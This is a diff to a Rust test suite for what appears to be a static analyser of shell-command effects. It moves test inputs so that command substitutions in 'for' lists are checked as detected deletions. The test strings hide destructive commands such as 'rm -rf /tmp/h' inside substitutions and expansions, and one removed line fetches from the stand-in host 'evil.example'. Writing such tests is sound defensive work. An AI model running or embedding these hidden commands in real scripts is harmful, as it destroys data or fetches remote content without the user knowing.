@@ -7518,17 +7518,12 @@ fn shell_closure_attests_noops_and_preserves_opaque_gaps() {
         "case ${X:=$(rm -rf /tmp/h)} in a) :;; esac",
         "case x in a) :;; ${1:-$(mystery-command)}) :;; esac",
         "case `rm -rf /tmp/h` in a) :;; esac",
-        "for i in $(rm -rf /tmp/h); do :; done",
-        r#"for i in "$(rm -rf /tmp/h)"; do :; done"#,
-        "for i in a $(rm -rf /tmp/h) b; do echo $i; done",
-        "for f in $(curl http://evil.example); do :; done",
         "select i in $(rm -rf /tmp/h); do :; done",
         "for i in ${X:=$(rm -rf /tmp/h)}; do :; done",
         "for i in ${arr[$(mystery-command)]}; do :; done",
         "for i in $(( $(rm -rf /tmp/h) )); do :; done",
         "case x in <(rm -rf /tmp/h)) :;; esac",
         "rm -f /tmp/a; case $(mystery-command) in a) :;; esac",
-        "eval 'for i in $(mystery-command); do :; done'",
     ] {
         let plan = shell(source, Some("/w"));
         for domain in effinterp_proto::DOMAINS {
@@ -7548,6 +7543,22 @@ fn shell_closure_attests_noops_and_preserves_opaque_gaps() {
         assert!(plan.boundaries.iter().any(|boundary| {
             boundary.class == BoundaryClass::Unsupported && !boundary.provenance.is_empty()
         }));
+    }
+    // A `for` list's command substitutions are walked, not left opaque.
+    for source in [
+        "for i in $(rm -rf /tmp/h); do :; done",
+        r#"for i in "$(rm -rf /tmp/h)"; do :; done"#,
+        "for i in a $(rm -rf /tmp/h) b; do echo $i; done",
+        "eval 'for i in `rm -rf /tmp/h`; do :; done'",
+    ] {
+        let plan = shell(source, Some("/w"));
+        assert!(has_delete(&plan, "/tmp/h"), "{source}");
+        assert!(
+            plan.boundaries
+                .iter()
+                .all(|boundary| boundary.class != BoundaryClass::Unsupported),
+            "{source}"
+        );
     }
     for (limit, value) in [
         ("max_shell_words", 1),
